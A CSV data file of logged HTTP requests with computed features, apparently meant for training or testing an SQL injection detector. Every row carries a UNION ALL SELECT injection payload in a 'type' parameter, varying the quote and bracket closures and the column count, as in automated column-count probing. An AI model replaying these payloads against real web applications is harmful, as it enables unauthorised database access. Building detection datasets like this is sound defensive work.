full_url,parsed_url,event_time,hostname,sql_keyword,params_length,request_volume,special_chars,value_to_length
/details.php?prod=5&type=-5702%29%29%29%20UNION%20ALL%20SELECT%204188%2C4188%2C4188%23,"/details.php?prod=5&type=-5702))) UNION ALL SELECT 4188,4188,4188#",1680093143.369484,10.0.2.31,4,42,170.3,1,11.904761904761905
/details.php?prod=5&type=-8897%29%29%29%20UNION%20ALL%20SELECT%207126%2C7126%2C7126%2C7126%23,"/details.php?prod=5&type=-8897))) UNION ALL SELECT 7126,7126,7126,7126#",1680093143.373009,10.0.2.31,4,47,170.3,1,10.638297872340425
/details.php?prod=5&type=-7026%29%29%29%20UNION%20ALL%20SELECT%206199%2C6199%2C6199%2C6199%2C6199%23,"/details.php?prod=5&type=-7026))) UNION ALL SELECT 6199,6199,6199,6199,6199#",1680093143.37623,10.0.2.31,4,52,170.3,1,9.615384615384615
/details.php?prod=5&type=-9191%29%29%29%20UNION%20ALL%20SELECT%209781%2C9781%2C9781%2C9781%2C9781%2C9781%23,"/details.php?prod=5&type=-9191))) UNION ALL SELECT 9781,9781,9781,9781,9781,9781#",1680093143.379935,10.0.2.31,4,57,170.3,1,8.771929824561404
/details.php?prod=5&type=-9324%29%29%29%20UNION%20ALL%20SELECT%206358%2C6358%2C6358%2C6358%2C6358%2C6358%2C6358%23,"/details.php?prod=5&type=-9324))) UNION ALL SELECT 6358,6358,6358,6358,6358,6358,6358#",1680093143.384003,10.0.2.31,4,62,170.3,1,8.064516129032258
/details.php?prod=5&type=-6850%29%29%29%20UNION%20ALL%20SELECT%208542%2C8542%2C8542%2C8542%2C8542%2C8542%2C8542%2C8542%23,"/details.php?prod=5&type=-6850))) UNION ALL SELECT 8542,8542,8542,8542,8542,8542,8542,8542#",1680093143.387232,10.0.2.31,4,67,170.3,1,7.462686567164179
/details.php?prod=5&type=-9531%29%29%29%20UNION%20ALL%20SELECT%206380%2C6380%2C6380%2C6380%2C6380%2C6380%2C6380%2C6380%2C6380%23,"/details.php?prod=5&type=-9531))) UNION ALL SELECT 6380,6380,6380,6380,6380,6380,6380,6380,6380#",1680093143.390559,10.0.2.31,4,72,170.3,1,6.944444444444445
/details.php?prod=5&type=-1932%29%29%29%20UNION%20ALL%20SELECT%205962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%23,"/details.php?prod=5&type=-1932))) UNION ALL SELECT 5962,5962,5962,5962,5962,5962,5962,5962,5962,5962#",1680093143.393927,10.0.2.31,4,77,170.3,1,6.4935064935064934
/details.php?prod=5&type=-5606%20UNION%20ALL%20SELECT%206153%23,/details.php?prod=5&type=-5606 UNION ALL SELECT 6153#,1680093143.397608,10.0.2.31,4,29,170.3,1,17.24137931034483
/details.php?prod=5&type=-3686%20UNION%20ALL%20SELECT%202970%2C2970%23,"/details.php?prod=5&type=-3686 UNION ALL SELECT 2970,2970#",1680093143.40111,10.0.2.31,4,34,170.3,1,14.705882352941176
/details.php?prod=5&type=-2142%20UNION%20ALL%20SELECT%207278%2C7278%2C7278%23,"/details.php?prod=5&type=-2142 UNION ALL SELECT 7278,7278,7278#",1680093143.404577,10.0.2.31,4,39,170.3,1,12.820512820512821
/details.php?prod=5&type=-8819%20UNION%20ALL%20SELECT%209984%2C9984%2C9984%2C9984%23,"/details.php?prod=5&type=-8819 UNION ALL SELECT 9984,9984,9984,9984#",1680093143.407644,10.0.2.31,4,44,170.3,1,11.363636363636363
/details.php?prod=5&type=-1004%20UNION%20ALL%20SELECT%208942%2C8942%2C8942%2C8942%2C8942%23,"/details.php?prod=5&type=-1004 UNION ALL SELECT 8942,8942,8942,8942,8942#",1680093143.410953,10.0.2.31,4,49,170.3,1,10.204081632653061
/details.php?prod=5&type=-9517%20UNION%20ALL%20SELECT%202377%2C2377%2C2377%2C2377%2C2377%2C2377%23,"/details.php?prod=5&type=-9517 UNION ALL SELECT 2377,2377,2377,2377,2377,2377#",1680093143.414952,10.0.2.31,4,54,170.3,1,9.25925925925926
/details.php?prod=5&type=-2172%20UNION%20ALL%20SELECT%201003%2C1003%2C1003%2C1003%2C1003%2C1003%2C1003%23,"/details.php?prod=5&type=-2172 UNION ALL SELECT 1003,1003,1003,1003,1003,1003,1003#",1680093143.418169,10.0.2.31,4,59,170.3,1,8.474576271186441
/details.php?prod=5&type=-5635%20UNION%20ALL%20SELECT%206436%2C6436%2C6436%2C6436%2C6436%2C6436%2C6436%2C6436%23,"/details.php?prod=5&type=-5635 UNION ALL SELECT 6436,6436,6436,6436,6436,6436,6436,6436#",1680093143.421612,10.0.2.31,4,64,170.3,1,7.8125
/details.php?prod=5&type=-6202%20UNION%20ALL%20SELECT%208811%2C8811%2C8811%2C8811%2C8811%2C8811%2C8811%2C8811%2C8811%23,"/details.php?prod=5&type=-6202 UNION ALL SELECT 8811,8811,8811,8811,8811,8811,8811,8811,8811#",1680093143.425038,10.0.2.31,4,69,170.3,1,7.246376811594203
/details.php?prod=5&type=-2697%20UNION%20ALL%20SELECT%208032%2C8032%2C8032%2C8032%2C8032%2C8032%2C8032%2C8032%2C8032%2C8032%23,"/details.php?prod=5&type=-2697 UNION ALL SELECT 8032,8032,8032,8032,8032,8032,8032,8032,8032,8032#",1680093143.428178,10.0.2.31,4,74,170.3,1,6.756756756756757
/details.php?prod=5&type=-3103%20UNION%20ALL%20SELECT%201915%23,/details.php?prod=5&type=-3103 UNION ALL SELECT 1915#,1680093143.432165,10.0.2.31,4,29,170.3,1,17.24137931034483
/details.php?prod=5&type=-1550%20UNION%20ALL%20SELECT%205939%2C5939%23,"/details.php?prod=5&type=-1550 UNION ALL SELECT 5939,5939#",1680093143.435719,10.0.2.31,4,34,170.3,1,14.705882352941176
/details.php?prod=5&type=-8067%20UNION%20ALL%20SELECT%209325%2C9325%2C9325%23,"/details.php?prod=5&type=-8067 UNION ALL SELECT 9325,9325,9325#",1680093143.438964,10.0.2.31,4,39,170.3,1,12.820512820512821
/details.php?prod=5&type=-6505%20UNION%20ALL%20SELECT%203586%2C3586%2C3586%2C3586%23,"/details.php?prod=5&type=-6505 UNION ALL SELECT 3586,3586,3586,3586#",1680093143.44263,10.0.2.31,4,44,170.3,1,11.363636363636363
/details.php?prod=5&type=-8912%20UNION%20ALL%20SELECT%206726%2C6726%2C6726%2C6726%2C6726%23,"/details.php?prod=5&type=-8912 UNION ALL SELECT 6726,6726,6726,6726,6726#",1680093143.446343,10.0.2.31,4,49,170.3,1,10.204081632653061
/details.php?prod=5&type=-1930%20UNION%20ALL%20SELECT%201213%2C1213%2C1213%2C1213%2C1213%2C1213%23,"/details.php?prod=5&type=-1930 UNION ALL SELECT 1213,1213,1213,1213,1213,1213#",1680093143.449788,10.0.2.31,4,54,170.3,1,9.25925925925926
/details.php?prod=5&type=-9697%20UNION%20ALL%20SELECT%205508%2C5508%2C5508%2C5508%2C5508%2C5508%2C5508%23,"/details.php?prod=5&type=-9697 UNION ALL SELECT 5508,5508,5508,5508,5508,5508,5508#",1680093143.453064,10.0.2.31,4,59,170.3,1,8.474576271186441
/details.php?prod=5&type=-9996%20UNION%20ALL%20SELECT%208807%2C8807%2C8807%2C8807%2C8807%2C8807%2C8807%2C8807%23,"/details.php?prod=5&type=-9996 UNION ALL SELECT 8807,8807,8807,8807,8807,8807,8807,8807#",1680093143.456503,10.0.2.31,4,64,170.3,1,7.8125
/details.php?prod=5&type=-7143%20UNION%20ALL%20SELECT%205870%2C5870%2C5870%2C5870%2C5870%2C5870%2C5870%2C5870%2C5870%23,"/details.php?prod=5&type=-7143 UNION ALL SELECT 5870,5870,5870,5870,5870,5870,5870,5870,5870#",1680093143.45961,10.0.2.31,4,69,170.3,1,7.246376811594203
/details.php?prod=5&type=-1361%20UNION%20ALL%20SELECT%209066%2C9066%2C9066%2C9066%2C9066%2C9066%2C9066%2C9066%2C9066%2C9066%23,"/details.php?prod=5&type=-1361 UNION ALL SELECT 9066,9066,9066,9066,9066,9066,9066,9066,9066,9066#",1680093143.462277,10.0.2.31,4,74,170.3,1,6.756756756756757
/details.php?prod=5&type=-1091%20UNION%20ALL%20SELECT%204667%23,/details.php?prod=5&type=-1091 UNION ALL SELECT 4667#,1680093143.466047,10.0.2.31,4,29,170.3,1,17.24137931034483
/details.php?prod=5&type=-5392%20UNION%20ALL%20SELECT%201191%2C1191%23,"/details.php?prod=5&type=-5392 UNION ALL SELECT 1191,1191#",1680093143.469427,10.0.2.31,4,34,170.3,1,14.705882352941176
/details.php?prod=5&type=-8488%20UNION%20ALL%20SELECT%203267%2C3267%2C3267%23,"/details.php?prod=5&type=-8488 UNION ALL SELECT 3267,3267,3267#",1680093143.472555,10.0.2.31,4,39,170.3,1,12.820512820512821
/details.php?prod=5&type=-9088%20UNION%20ALL%20SELECT%205405%2C5405%2C5405%2C5405%23,"/details.php?prod=5&type=-9088 UNION ALL SELECT 5405,5405,5405,5405#",1680093143.475964,10.0.2.31,4,44,170.3,1,11.363636363636363
/details.php?prod=5&type=-6372%20UNION%20ALL%20SELECT%202716%2C2716%2C2716%2C2716%2C2716%23,"/details.php?prod=5&type=-6372 UNION ALL SELECT 2716,2716,2716,2716,2716#",1680093143.479414,10.0.2.31,4,49,170.3,1,10.204081632653061
/details.php?prod=5&type=-6604%20UNION%20ALL%20SELECT%207001%2C7001%2C7001%2C7001%2C7001%2C7001%23,"/details.php?prod=5&type=-6604 UNION ALL SELECT 7001,7001,7001,7001,7001,7001#",1680093143.482942,10.0.2.31,4,54,170.3,1,9.25925925925926
/details.php?prod=5&type=-2493%20UNION%20ALL%20SELECT%205444%2C5444%2C5444%2C5444%2C5444%2C5444%2C5444%23,"/details.php?prod=5&type=-2493 UNION ALL SELECT 5444,5444,5444,5444,5444,5444,5444#",1680093143.485873,10.0.2.31,4,59,170.3,1,8.474576271186441
/details.php?prod=5&type=-5812%20UNION%20ALL%20SELECT%208261%2C8261%2C8261%2C8261%2C8261%2C8261%2C8261%2C8261%23,"/details.php?prod=5&type=-5812 UNION ALL SELECT 8261,8261,8261,8261,8261,8261,8261,8261#",1680093143.489202,10.0.2.31,4,64,170.3,1,7.8125
/details.php?prod=5&type=-6990%20UNION%20ALL%20SELECT%204922%2C4922%2C4922%2C4922%2C4922%2C4922%2C4922%2C4922%2C4922%23,"/details.php?prod=5&type=-6990 UNION ALL SELECT 4922,4922,4922,4922,4922,4922,4922,4922,4922#",1680093143.492372,10.0.2.31,4,69,170.3,1,7.246376811594203
/details.php?prod=5&type=-8142%20UNION%20ALL%20SELECT%207478%2C7478%2C7478%2C7478%2C7478%2C7478%2C7478%2C7478%2C7478%2C7478%23,"/details.php?prod=5&type=-8142 UNION ALL SELECT 7478,7478,7478,7478,7478,7478,7478,7478,7478,7478#",1680093143.495469,10.0.2.31,4,74,170.3,1,6.756756756756757
/details.php?prod=5&type=-3050%29%29%20AS%20eaqw%20WHERE%208034%3D8034%20UNION%20ALL%20SELECT%208034%23,/details.php?prod=5&type=-3050)) AS eaqw WHERE 8034=8034 UNION ALL SELECT 8034#,1680093143.499725,10.0.2.31,6,55,170.3,1,12.727272727272727
/details.php?prod=5&type=-2440%29%29%20AS%20mWyj%20WHERE%208152%3D8152%20UNION%20ALL%20SELECT%208152%2C8152%23,"/details.php?prod=5&type=-2440)) AS mWyj WHERE 8152=8152 UNION ALL SELECT 8152,8152#",1680093143.503426,10.0.2.31,6,60,170.3,1,11.666666666666666
/details.php?prod=5&type=-5026%29%29%20AS%20oDTX%20WHERE%209443%3D9443%20UNION%20ALL%20SELECT%209443%2C9443%2C9443%23,"/details.php?prod=5&type=-5026)) AS oDTX WHERE 9443=9443 UNION ALL SELECT 9443,9443,9443#",1680093143.506484,10.0.2.31,6,65,170.3,1,10.76923076923077
/details.php?prod=5&type=-2461%29%29%20AS%20DAlU%20WHERE%204433%3D4433%20UNION%20ALL%20SELECT%204433%2C4433%2C4433%2C4433%23,"/details.php?prod=5&type=-2461)) AS DAlU WHERE 4433=4433 UNION ALL SELECT 4433,4433,4433,4433#",1680093143.509948,10.0.2.31,6,70,170.3,1,10.0
/details.php?prod=5&type=-1535%29%29%20AS%20uvsb%20WHERE%207130%3D7130%20UNION%20ALL%20SELECT%207130%2C7130%2C7130%2C7130%2C7130%23,"/details.php?prod=5&type=-1535)) AS uvsb WHERE 7130=7130 UNION ALL SELECT 7130,7130,7130,7130,7130#",1680093143.513622,10.0.2.31,6,75,170.3,1,9.333333333333334
/details.php?prod=5&type=-9713%29%29%20AS%20khxa%20WHERE%204036%3D4036%20UNION%20ALL%20SELECT%204036%2C4036%2C4036%2C4036%2C4036%2C4036%23,"/details.php?prod=5&type=-9713)) AS khxa WHERE 4036=4036 UNION ALL SELECT 4036,4036,4036,4036,4036,4036#",1680093143.517005,10.0.2.31,6,80,170.3,1,8.75
/details.php?prod=5&type=-9695%29%29%20AS%20wSTl%20WHERE%202732%3D2732%20UNION%20ALL%20SELECT%202732%2C2732%2C2732%2C2732%2C2732%2C2732%2C2732%23,"/details.php?prod=5&type=-9695)) AS wSTl WHERE 2732=2732 UNION ALL SELECT 2732,2732,2732,2732,2732,2732,2732#",1680093143.520289,10.0.2.31,6,85,170.3,1,8.235294117647058
/details.php?prod=5&type=-8565%29%29%20AS%20YHsJ%20WHERE%206651%3D6651%20UNION%20ALL%20SELECT%206651%2C6651%2C6651%2C6651%2C6651%2C6651%2C6651%2C6651%23,"/details.php?prod=5&type=-8565)) AS YHsJ WHERE 6651=6651 UNION ALL SELECT 6651,6651,6651,6651,6651,6651,6651,6651#",1680093143.523671,10.0.2.31,6,90,170.3,1,7.777777777777778
/details.php?prod=5&type=-6103%29%29%20AS%20QENE%20WHERE%209641%3D9641%20UNION%20ALL%20SELECT%209641%2C9641%2C9641%2C9641%2C9641%2C9641%2C9641%2C9641%2C9641%23,"/details.php?prod=5&type=-6103)) AS QENE WHERE 9641=9641 UNION ALL SELECT 9641,9641,9641,9641,9641,9641,9641,9641,9641#",1680093143.52725,10.0.2.31,6,95,170.3,1,7.368421052631579
/details.php?prod=5&type=-7445%29%29%20AS%20mtZV%20WHERE%206118%3D6118%20UNION%20ALL%20SELECT%206118%2C6118%2C6118%2C6118%2C6118%2C6118%2C6118%2C6118%2C6118%2C6118%23,"/details.php?prod=5&type=-7445)) AS mtZV WHERE 6118=6118 UNION ALL SELECT 6118,6118,6118,6118,6118,6118,6118,6118,6118,6118#",1680093143.530791,10.0.2.31,6,100,170.3,1,7.0
/details.php?prod=5&type=-1022%29%20AS%20GtfB%20WHERE%201628%3D1628%20UNION%20ALL%20SELECT%201628%23,/details.php?prod=5&type=-1022) AS GtfB WHERE 1628=1628 UNION ALL SELECT 1628#,1680093143.53452,10.0.2.31,6,54,170.3,1,12.962962962962964
/details.php?prod=5&type=-6229%29%20AS%20Yzbh%20WHERE%204171%3D4171%20UNION%20ALL%20SELECT%204171%2C4171%23,"/details.php?prod=5&type=-6229) AS Yzbh WHERE 4171=4171 UNION ALL SELECT 4171,4171#",1680093143.538238,10.0.2.31,6,59,170.3,1,11.864406779661017
/details.php?prod=5&type=-9376%29%20AS%20BrPy%20WHERE%205816%3D5816%20UNION%20ALL%20SELECT%205816%2C5816%2C5816%23,"/details.php?prod=5&type=-9376) AS BrPy WHERE 5816=5816 UNION ALL SELECT 5816,5816,5816#",1680093143.541221,10.0.2.31,6,64,170.3,1,10.9375
/details.php?prod=5&type=-8094%29%20AS%20RKCb%20WHERE%207398%3D7398%20UNION%20ALL%20SELECT%207398%2C7398%2C7398%2C7398%23,"/details.php?prod=5&type=-8094) AS RKCb WHERE 7398=7398 UNION ALL SELECT 7398,7398,7398,7398#",1680093143.544905,10.0.2.31,6,69,170.3,1,10.144927536231885
/details.php?prod=5&type=-5939%29%20AS%20gLRG%20WHERE%208879%3D8879%20UNION%20ALL%20SELECT%208879%2C8879%2C8879%2C8879%2C8879%23,"/details.php?prod=5&type=-5939) AS gLRG WHERE 8879=8879 UNION ALL SELECT 8879,8879,8879,8879,8879#",1680093143.54884,10.0.2.31,6,74,170.3,1,9.45945945945946
/details.php?prod=5&type=-7070%29%20AS%20cOpz%20WHERE%209051%3D9051%20UNION%20ALL%20SELECT%209051%2C9051%2C9051%2C9051%2C9051%2C9051%23,"/details.php?prod=5&type=-7070) AS cOpz WHERE 9051=9051 UNION ALL SELECT 9051,9051,9051,9051,9051,9051#",1680093143.551835,10.0.2.31,6,79,170.3,1,8.860759493670885
/details.php?prod=5&type=-4567%29%20AS%20JBVp%20WHERE%206536%3D6536%20UNION%20ALL%20SELECT%206536%2C6536%2C6536%2C6536%2C6536%2C6536%2C6536%23,"/details.php?prod=5&type=-4567) AS JBVp WHERE 6536=6536 UNION ALL SELECT 6536,6536,6536,6536,6536,6536,6536#",1680093143.555544,10.0.2.31,6,84,170.3,1,8.333333333333334
/details.php?prod=5&type=-4601%29%20AS%20uPQl%20WHERE%207846%3D7846%20UNION%20ALL%20SELECT%207846%2C7846%2C7846%2C7846%2C7846%2C7846%2C7846%2C7846%23,"/details.php?prod=5&type=-4601) AS uPQl WHERE 7846=7846 UNION ALL SELECT 7846,7846,7846,7846,7846,7846,7846,7846#",1680093143.559681,10.0.2.31,6,89,170.3,1,7.865168539325842
/details.php?prod=5&type=-3281%29%20AS%20Qtyr%20WHERE%206205%3D6205%20UNION%20ALL%20SELECT%206205%2C6205%2C6205%2C6205%2C6205%2C6205%2C6205%2C6205%2C6205%23,"/details.php?prod=5&type=-3281) AS Qtyr WHERE 6205=6205 UNION ALL SELECT 6205,6205,6205,6205,6205,6205,6205,6205,6205#",1680093143.563104,10.0.2.31,6,94,170.3,1,7.446808510638298
/details.php?prod=5&type=-7263%29%20AS%20hUDv%20WHERE%201944%3D1944%20UNION%20ALL%20SELECT%201944%2C1944%2C1944%2C1944%2C1944%2C1944%2C1944%2C1944%2C1944%2C1944%23,"/details.php?prod=5&type=-7263) AS hUDv WHERE 1944=1944 UNION ALL SELECT 1944,1944,1944,1944,1944,1944,1944,1944,1944,1944#",1680093143.566898,10.0.2.31,6,99,170.3,1,7.070707070707071
/details.php?prod=5&type=-6713%60%20WHERE%209124%3D9124%20UNION%20ALL%20SELECT%209124%23,/details.php?prod=5&type=-6713` WHERE 9124=9124 UNION ALL SELECT 9124#,1680093143.570169,10.0.2.31,5,46,170.3,1,13.043478260869565
/details.php?prod=5&type=-9501%60%20WHERE%208833%3D8833%20UNION%20ALL%20SELECT%208833%2C8833%23,"/details.php?prod=5&type=-9501` WHERE 8833=8833 UNION ALL SELECT 8833,8833#",1680093143.573252,10.0.2.31,5,51,170.3,1,11.764705882352942
/details.php?prod=5&type=-1921%60%20WHERE%209560%3D9560%20UNION%20ALL%20SELECT%209560%2C9560%2C9560%23,"/details.php?prod=5&type=-1921` WHERE 9560=9560 UNION ALL SELECT 9560,9560,9560#",1680093143.576591,10.0.2.31,5,56,170.3,1,10.714285714285714
/details.php?prod=5&type=-3138%60%20WHERE%208019%3D8019%20UNION%20ALL%20SELECT%208019%2C8019%2C8019%2C8019%23,"/details.php?prod=5&type=-3138` WHERE 8019=8019 UNION ALL SELECT 8019,8019,8019,8019#",1680093143.580207,10.0.2.31,5,61,170.3,1,9.836065573770492
/details.php?prod=5&type=-9688%60%20WHERE%209087%3D9087%20UNION%20ALL%20SELECT%209087%2C9087%2C9087%2C9087%2C9087%23,"/details.php?prod=5&type=-9688` WHERE 9087=9087 UNION ALL SELECT 9087,9087,9087,9087,9087#",1680093143.585532,10.0.2.31,5,66,170.3,1,9.090909090909092
/details.php?prod=5&type=-7611%60%20WHERE%205050%3D5050%20UNION%20ALL%20SELECT%205050%2C5050%2C5050%2C5050%2C5050%2C5050%23,"/details.php?prod=5&type=-7611` WHERE 5050=5050 UNION ALL SELECT 5050,5050,5050,5050,5050,5050#",1680093143.589103,10.0.2.31,5,71,170.3,1,8.450704225352112
/details.php?prod=5&type=-2877%60%20WHERE%207972%3D7972%20UNION%20ALL%20SELECT%207972%2C7972%2C7972%2C7972%2C7972%2C7972%2C7972%23,"/details.php?prod=5&type=-2877` WHERE 7972=7972 UNION ALL SELECT 7972,7972,7972,7972,7972,7972,7972#",1680093143.592489,10.0.2.31,5,76,170.3,1,7.894736842105263
/details.php?prod=5&type=-6649%60%20WHERE%206125%3D6125%20UNION%20ALL%20SELECT%206125%2C6125%2C6125%2C6125%2C6125%2C6125%2C6125%2C6125%23,"/details.php?prod=5&type=-6649` WHERE 6125=6125 UNION ALL SELECT 6125,6125,6125,6125,6125,6125,6125,6125#",1680093143.595945,10.0.2.31,5,81,170.3,1,7.407407407407407
/details.php?prod=5&type=-9731%60%20WHERE%207204%3D7204%20UNION%20ALL%20SELECT%207204%2C7204%2C7204%2C7204%2C7204%2C7204%2C7204%2C7204%2C7204%23,"/details.php?prod=5&type=-9731` WHERE 7204=7204 UNION ALL SELECT 7204,7204,7204,7204,7204,7204,7204,7204,7204#",1680093143.599738,10.0.2.31,5,86,170.3,1,6.976744186046512
/details.php?prod=5&type=-9728%60%20WHERE%208219%3D8219%20UNION%20ALL%20SELECT%208219%2C8219%2C8219%2C8219%2C8219%2C8219%2C8219%2C8219%2C8219%2C8219%23,"/details.php?prod=5&type=-9728` WHERE 8219=8219 UNION ALL SELECT 8219,8219,8219,8219,8219,8219,8219,8219,8219,8219#",1680093143.603328,10.0.2.31,5,91,170.3,1,6.593406593406593
/details.php?prod=5&type=-7743%60%29%20WHERE%205452%3D5452%20UNION%20ALL%20SELECT%205452%23,/details.php?prod=5&type=-7743`) WHERE 5452=5452 UNION ALL SELECT 5452#,1680093143.606925,10.0.2.31,5,47,170.3,1,12.76595744680851
/details.php?prod=5&type=-1550%60%29%20WHERE%202253%3D2253%20UNION%20ALL%20SELECT%202253%2C2253%23,"/details.php?prod=5&type=-1550`) WHERE 2253=2253 UNION ALL SELECT 2253,2253#",1680093143.610498,10.0.2.31,5,52,170.3,1,11.538461538461538
/details.php?prod=5&type=-1812%60%29%20WHERE%202023%3D2023%20UNION%20ALL%20SELECT%202023%2C2023%2C2023%23,"/details.php?prod=5&type=-1812`) WHERE 2023=2023 UNION ALL SELECT 2023,2023,2023#",1680093143.61424,10.0.2.31,5,57,170.3,1,10.526315789473685
/details.php?prod=5&type=-1656%60%29%20WHERE%203329%3D3329%20UNION%20ALL%20SELECT%203329%2C3329%2C3329%2C3329%23,"/details.php?prod=5&type=-1656`) WHERE 3329=3329 UNION ALL SELECT 3329,3329,3329,3329#",1680093143.617573,10.0.2.31,5,62,170.3,1,9.67741935483871
/details.php?prod=5&type=-3195%60%29%20WHERE%207138%3D7138%20UNION%20ALL%20SELECT%207138%2C7138%2C7138%2C7138%2C7138%23,"/details.php?prod=5&type=-3195`) WHERE 7138=7138 UNION ALL SELECT 7138,7138,7138,7138,7138#",1680093143.620827,10.0.2.31,5,67,170.3,1,8.955223880597014
/details.php?prod=5&type=-7470%60%29%20WHERE%208423%3D8423%20UNION%20ALL%20SELECT%208423%2C8423%2C8423%2C8423%2C8423%2C8423%23,"/details.php?prod=5&type=-7470`) WHERE 8423=8423 UNION ALL SELECT 8423,8423,8423,8423,8423,8423#",1680093143.624358,10.0.2.31,5,72,170.3,1,8.333333333333334
/details.php?prod=5&type=-5484%60%29%20WHERE%208380%3D8380%20UNION%20ALL%20SELECT%208380%2C8380%2C8380%2C8380%2C8380%2C8380%2C8380%23,"/details.php?prod=5&type=-5484`) WHERE 8380=8380 UNION ALL SELECT 8380,8380,8380,8380,8380,8380,8380#",1680093143.627542,10.0.2.31,5,77,170.3,1,7.792207792207792
/details.php?prod=5&type=-4220%60%29%20WHERE%208899%3D8899%20UNION%20ALL%20SELECT%208899%2C8899%2C8899%2C8899%2C8899%2C8899%2C8899%2C8899%23,"/details.php?prod=5&type=-4220`) WHERE 8899=8899 UNION ALL SELECT 8899,8899,8899,8899,8899,8899,8899,8899#",1680093143.630937,10.0.2.31,5,82,170.3,1,7.317073170731708
/details.php?prod=5&type=-7765%60%29%20WHERE%208831%3D8831%20UNION%20ALL%20SELECT%208831%2C8831%2C8831%2C8831%2C8831%2C8831%2C8831%2C8831%2C8831%23,"/details.php?prod=5&type=-7765`) WHERE 8831=8831 UNION ALL SELECT 8831,8831,8831,8831,8831,8831,8831,8831,8831#",1680093143.634879,10.0.2.31,5,87,170.3,1,6.896551724137931
/details.php?prod=5&type=-5072%60%29%20WHERE%203200%3D3200%20UNION%20ALL%20SELECT%203200%2C3200%2C3200%2C3200%2C3200%2C3200%2C3200%2C3200%2C3200%2C3200%23,"/details.php?prod=5&type=-5072`) WHERE 3200=3200 UNION ALL SELECT 3200,3200,3200,3200,3200,3200,3200,3200,3200,3200#",1680093143.638106,10.0.2.31,5,92,170.3,1,6.521739130434782
/details.php?prod=5&type=-1029%27%29%20UNION%20ALL%20SELECT%206636%23,/details.php?prod=5&type=-1029') UNION ALL SELECT 6636#,1680093143.641624,10.0.2.31,4,31,170.3,2,19.35483870967742
/details.php?prod=5&type=-1693%27%29%20UNION%20ALL%20SELECT%206265%2C6265%23,"/details.php?prod=5&type=-1693') UNION ALL SELECT 6265,6265#",1680093143.645223,10.0.2.31,4,36,170.3,2,16.666666666666668
/details.php?prod=5&type=-3264%27%29%20UNION%20ALL%20SELECT%205334%2C5334%2C5334%23,"/details.php?prod=5&type=-3264') UNION ALL SELECT 5334,5334,5334#",1680093143.649428,10.0.2.31,4,41,170.3,2,14.634146341463415
/details.php?prod=5&type=-6510%27%29%20UNION%20ALL%20SELECT%208093%2C8093%2C8093%2C8093%23,"/details.php?prod=5&type=-6510') UNION ALL SELECT 8093,8093,8093,8093#",1680093143.652584,10.0.2.31,4,46,170.3,2,13.043478260869565
/details.php?prod=5&type=-8457%27%29%20UNION%20ALL%20SELECT%205058%2C5058%2C5058%2C5058%2C5058%23,"/details.php?prod=5&type=-8457') UNION ALL SELECT 5058,5058,5058,5058,5058#",1680093143.656264,10.0.2.31,4,51,170.3,2,11.764705882352942
/details.php?prod=5&type=-9952%27%29%20UNION%20ALL%20SELECT%208154%2C8154%2C8154%2C8154%2C8154%2C8154%23,"/details.php?prod=5&type=-9952') UNION ALL SELECT 8154,8154,8154,8154,8154,8154#",1680093143.6597,10.0.2.31,4,56,170.3,2,10.714285714285714
/details.php?prod=5&type=-5724%27%29%20UNION%20ALL%20SELECT%209612%2C9612%2C9612%2C9612%2C9612%2C9612%2C9612%23,"/details.php?prod=5&type=-5724') UNION ALL SELECT 9612,9612,9612,9612,9612,9612,9612#",1680093143.662876,10.0.2.31,4,61,170.3,2,9.836065573770492
/details.php?prod=5&type=-1105%27%29%20UNION%20ALL%20SELECT%203565%2C3565%2C3565%2C3565%2C3565%2C3565%2C3565%2C3565%23,"/details.php?prod=5&type=-1105') UNION ALL SELECT 3565,3565,3565,3565,3565,3565,3565,3565#",1680093143.666827,10.0.2.31,4,66,170.3,2,9.090909090909092
/details.php?prod=5&type=-7930%27%29%20UNION%20ALL%20SELECT%203257%2C3257%2C3257%2C3257%2C3257%2C3257%2C3257%2C3257%2C3257%23,"/details.php?prod=5&type=-7930') UNION ALL SELECT 3257,3257,3257,3257,3257,3257,3257,3257,3257#",1680093143.670345,10.0.2.31,4,71,170.3,2,8.450704225352112
/details.php?prod=5&type=-3274%27%29%20UNION%20ALL%20SELECT%206930%2C6930%2C6930%2C6930%2C6930%2C6930%2C6930%2C6930%2C6930%2C6930%23,"/details.php?prod=5&type=-3274') UNION ALL SELECT 6930,6930,6930,6930,6930,6930,6930,6930,6930,6930#",1680093143.67348,10.0.2.31,4,76,170.3,2,7.894736842105263
/details.php?prod=5&type=-4976%27%20UNION%20ALL%20SELECT%206834%23,/details.php?prod=5&type=-4976' UNION ALL SELECT 6834#,1680093143.6773,10.0.2.31,4,30,170.3,2,20.0
